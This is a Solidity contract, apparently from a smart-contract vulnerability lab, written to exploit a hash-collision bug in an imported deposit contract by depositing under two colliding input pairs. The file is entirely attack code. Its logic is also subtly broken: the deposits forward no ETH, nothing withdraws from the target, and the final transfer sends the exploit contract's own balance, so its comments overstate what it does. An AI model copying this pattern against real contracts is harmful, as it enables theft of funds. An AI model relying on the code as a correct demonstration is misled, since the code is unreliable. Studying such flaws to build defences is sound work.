// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./Hash-collisions.sol";

contract MaliciousHashCollisionExploit {
    HashCollisionBug public hashCollisionBug;

    constructor(address _hashCollisionBugAddress) {
        hashCollisionBug = HashCollisionBug(_hashCollisionBugAddress);
    }

    function exploitHashCollision() public payable {
        // Deposit 1 ETH using the input pair "AAA" and "BBB"
        hashCollisionBug.deposit("AAA", "BBB");

        // Deposit another 1 ETH using the input pair "AA" and "ABBB"
        // which will produce the same hash as the previous deposit
        hashCollisionBug.deposit("AA", "ABBB");

        // Now the attacker can withdraw the full 2 ETH balance
        // associated with the colliding hash
        uint256 balance = hashCollisionBug.balances(hashCollisionBug.createHash("AAA", "BBB"));
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Withdrawal failed");
    }
}